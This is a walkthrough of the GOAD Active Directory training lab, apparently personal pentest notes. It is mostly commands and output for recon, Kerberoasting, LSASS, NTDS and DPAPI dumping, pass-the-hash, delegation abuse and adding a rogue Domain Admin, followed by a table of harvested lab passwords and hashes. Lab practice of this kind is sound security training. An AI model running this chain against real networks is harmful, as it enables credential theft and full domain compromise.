---
kind: walkthrough
platform: goad
target: sevenkingdoms
scope: internal
os: windows
tags: [active-directory, goad]
---

# GOAD — Game of Active Directory

Multi-domain AD lab. Two forests: `sevenkingdoms.local` (with child `north.sevenkingdoms.local`) and `essos.local`.

## Environment

| Host | IP | Domain |
| --- | --- | --- |
| KINGSLANDING | 10.2.10.10 | sevenkingdoms.local |
| WINTERFELL | 10.2.10.11 | north.sevenkingdoms.local |
| CASTELBLACK | 10.2.10.12 | north.sevenkingdoms.local |
| MEEREEN | 10.2.10.13 | essos.local |
| BRAAVOS | 10.2.10.14 | essos.local |

Known creds harvested along the way are tracked at the bottom.

## Recon

Full TCP + UDP sweep of the subnet to establish the host list.

<!-- meta: technique=port-scanning -->
```bash
nmap -sSCV 10.2.10.0/24 -T5 -p0- -oA tcp_full
nmap -sUCV 10.2.10.0/24 -T5 --top-ports 1000 -oA udp_1000
```

Certificate data in the scan output is enough to build a hosts file by hand:

<!-- meta: technique=hostfile-generation -->
```bash
cat <<'EOF' >> /etc/hosts
10.2.10.10 sevenkingdoms.local kingslanding.sevenkingdoms.local
10.2.10.11 north.sevenkingdoms.local winterfell.north.sevenkingdoms.local
10.2.10.12 castelblack.north.sevenkingdoms.local
10.2.10.13 meeren.essos.local essos.local
10.2.10.14 braavos.essos.local
EOF
```

Grep the greppable output for DNS/Kerberos/LDAP to spot domain controllers, then build target files for nxc:

<!-- meta: technique=hostfile-generation -->
```bash
sed '/ 53/!d; / 88/!d; / 139/!d' ./nmap/tcp_full.gnmap | cut -d ' ' -f2 > domain-controllers.txt
grep "Up" ./nmap/tcp_full.gnmap | cut -d ' ' -f2 > targets.txt
```
<!-- output -->
```
Host: 10.2.10.10   Host: 10.2.10.11   Host: 10.2.10.13   (the three DCs)
```

`targets.txt` needed a manual trim to drop the router and the Kali box.

Shortcut: nxc can generate the hosts file for you instead of the manual crawl.

<!-- meta: technique=hostfile-generation -->
```bash
nxc smb 10.2.10.0/24 --generate-hosts-file ./hostsfile
```

## Quick vuln sweep

Reference list of nxc quick wins: https://www.netexec.wiki/smb-protocol/scan-for-vulnerabilities

<!-- meta: technique=vuln-scanning -->
```bash
nxc smb domain-controllers.txt -u '' -p '' -M zerologon
```
<!-- output -->
```
ZEROLOGON  10.2.10.13  MEEREEN       Attack failed. Target is probably patched.
ZEROLOGON  10.2.10.11  WINTERFELL    Attack failed. Target is probably patched.
ZEROLOGON  10.2.10.10  KINGSLANDING  Attack failed. Target is probably patched.
[+] Null Auth:True on WINTERFELL and KINGSLANDING
```

Zerologon patched, but null auth works on WINTERFELL and KINGSLANDING.

<!-- meta: technique=vuln-scanning -->
```bash
nxc smb targets.txt -u '' -p '' -M smbghost
```
<!-- output -->
```
SMBGHOST  10.2.10.10/11/12/13/14  Potentially vulnerable to SMBGhost (CVE-2020-0796)
```

<!-- meta: technique=coercion -->
```bash
nxc smb targets.txt -u '' -p '' -M coerce_plus
```
<!-- output -->
```
COERCE_PLUS  10.2.10.10  KINGSLANDING  VULNERABLE, PetitPotam
COERCE_PLUS  10.2.10.11  WINTERFELL    VULNERABLE, PetitPotam
COERCE_PLUS  10.2.10.10/12/13/14       VULNERABLE, PrinterBug
```

Coercion looks promising once we have creds.

## Enumeration

Anonymous share enum returns nothing; guest auth does.

<!-- meta: technique=share-enumeration -->
```bash
nxc smb targets.txt -u '' -p '' --shares
nxc smb targets.txt -u 'guest' -p '' --shares
```
<!-- output -->
```
CASTELBLACK  all       READ,WRITE   Writable share for NTLM coercion attacks
CASTELBLACK  thewall                jon.snow/samwell.tarly lateral movement
BRAAVOS      all       READ,WRITE   Writable share
```

READ/WRITE on shares in CASTELBLACK and BRAAVOS.

Anonymous user enumeration against the DCs pulls the full user list — and one description leaks a password.

<!-- meta: technique=user-enumeration -->
```bash
nxc smb domain-controllers.txt -u '' -p '' --users
```
<!-- output -->
```
WINTERFELL  samwell.tarly  Samwell Tarly (Password : Heartsbane)
WINTERFELL  [*] Enumerated 16 local users: NORTH
```

`samwell.tarly : Heartsbane` — use it to re-check CASTELBLACK shares as an authenticated user:

<!-- meta: technique=share-enumeration -->
```bash
nxc smb castelblack.north.sevenkingdoms.local -u 'samwell.tarly' -p 'Heartsbane' --shares
```
<!-- output -->
```
CASTELBLACK  public   READ,WRITE
CASTELBLACK  thewall  READ,WRITE
```

Spidering `thewall` turns up a note revealing `arya.stark : Needle`.

## AD enumeration (BloodHound)

<!-- meta: technique=ad-enumeration -->
```bash
bloodhound-ce-python -u arya.stark -p Needle -d north.sevenkingdoms.local -ns 10.2.10.11 -c All,Session
```

## Credential access

### Kerberoast

<!-- meta: technique=kerberoasting -->
```bash
impacket-GetUserSPNs north.sevenkingdoms.local/arya.stark:Needle -dc-ip 10.2.10.11 -request
hashcat -m 13100 roast.txt /usr/share/wordlists/rockyou.txt
```

### AS-REP roast

<!-- meta: technique=asreproasting -->
```bash
nxc ldap targets.txt -u 'arya.stark' -p 'Needle' --asreproast asreproast-output.txt
hashcat -m 18200 asreproast-output.txt /usr/share/wordlists/rockyou.txt
```

### Loot files with Snaffler

Download: https://github.com/SnaffCon/Snaffler

<!-- meta: technique=data-discovery -->
```bash
.\snaffler.exe -o output.txt
```

### Dump LSASS

<!-- meta: technique=lsass-dump -->
```bash
nxc smb 10.2.10.12 -u 'jeor.mormont' -p '_L0ngCl@w_' -M lsassy
```

### Pass-the-hash check

<!-- meta: technique=pass-the-hash -->
```bash
nxc smb winterfell.north.sevenkingdoms.local -u 'robb.stark' -H '831486ac7f26860c9e2f51ac91e1a07a'
```
<!-- output -->
```
WINTERFELL  north.sevenkingdoms.local\robb.stark:831486... (Pwn3d!)
```

### Dump NTDS (needs DA or local admin on DC)

<!-- meta: technique=ntds-dump -->
```bash
nxc smb winterfell.north.sevenkingdoms.local -u 'robb.stark' -H '831486ac7f26860c9e2f51ac91e1a07a' --ntds
```

### Dump DPAPI from the DC

<!-- meta: technique=dpapi-looting -->
```bash
nxc smb winterfell.north.sevenkingdoms.local -u 'robb.stark' -H '831486ac7f26860c9e2f51ac91e1a07a' --dpapi
```
<!-- output -->
```
[+] User is Domain Administrator, exporting domain backupkey...
[+] Got 7 decrypted masterkeys. Looting secrets...
[robb.stark][CREDENTIAL] TERMSRV/castelblack - NORTH\robb.stark:sexywolfy
[SYSTEM][CREDENTIAL] TaskScheduler - NORTH\eddard.stark:FightP3aceAndHonor!
```

## Lateral movement

### Constrained delegation

<!-- meta: technique=delegation-abuse -->
```bash
impacket-getST -spn 'CIFS/WINTERFELL.north.sevenkingdoms.local' -impersonate Administrator 'north.sevenkingdoms.local/jon.snow:iknownothing' -altservice CIFS
```

### Pass-the-hash across the domain

<!-- meta: technique=pass-the-hash -->
```bash
nxc smb 10.2.10.0/24 -u arya.stark -p Needle -d sevenkingdoms.local
```

### Cross-domain user enumeration

Using NORTH creds against the parent and essos domains:

<!-- meta: technique=user-enumeration -->
```bash
nxc smb 10.2.10.10 -u 'eddard.stark' -p 'FightP3aceAndHonor!' -d 'north.sevenkingdoms.local' --users
nxc smb 10.2.10.13 -u 'tywin.lannister' -p 'powerkingftw135' -d 'sevenkingdoms.local' --users
```

## Persistence

<!-- meta: technique=add-domain-admin -->
```cmd
net user /add hawkeye Password1 /domain
net group "Domain Admins" hawkeye /add /domain
```

## Harvested credentials

| User | Secret | Domain |
| --- | --- | --- |
| samwell.tarly | Heartsbane | north.sevenkingdoms.local |
| arya.stark | Needle | north.sevenkingdoms.local |
| jon.snow | iknownothing | north.sevenkingdoms.local |
| brandon.stark | iseedeadpeople | north.sevenkingdoms.local |
| jeor.mormont | _L0ngCl@w_ | north.sevenkingdoms.local |
| robb.stark | sexywolfy / 831486ac...a07a | north.sevenkingdoms.local |
| eddard.stark | FightP3aceAndHonor! | north.sevenkingdoms.local |
| tywin.lannister | powerkingftw135 | sevenkingdoms.local |
